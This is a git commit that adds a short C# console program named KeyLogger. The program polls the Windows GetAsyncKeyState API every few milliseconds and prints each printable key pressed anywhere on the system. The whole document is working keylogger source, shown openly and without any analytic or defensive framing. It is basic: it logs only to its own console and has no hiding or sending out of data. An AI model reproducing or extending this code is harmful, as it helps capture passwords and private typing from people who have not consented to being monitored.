367a372b9cab6e760021563844531a5d12a2f6f8
Arthur Ghlijyan <deckuser@hotmail.com>
2020-11-02 19:39:40 +0400

    Add project files.

---
+++ KeyLogger/Program.cs
@@ -0,0 +1,31 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+namespace KeyLogger
+{
+    class Program
+    {
+        [DllImport("User32.dll")]
+        public static extern short GetAsyncKeyState(int keyAsciiNumber);
+
+        static string keylog = string.Empty;
+
+        static void Main(string[] args)
+        {
+            while (true)
+            {
+                Thread.Sleep(5);
+                for (int keyNumber = 32; keyNumber < 127; keyNumber++)
+                {
+                    int keyState = GetAsyncKeyState(keyNumber);
+
+                    if (keyState == short.MinValue + 1)
+                    {
+                        Console.Write((char)keyNumber + ", ");
+                    }
+                }
+            }
+        }
+    }
+}
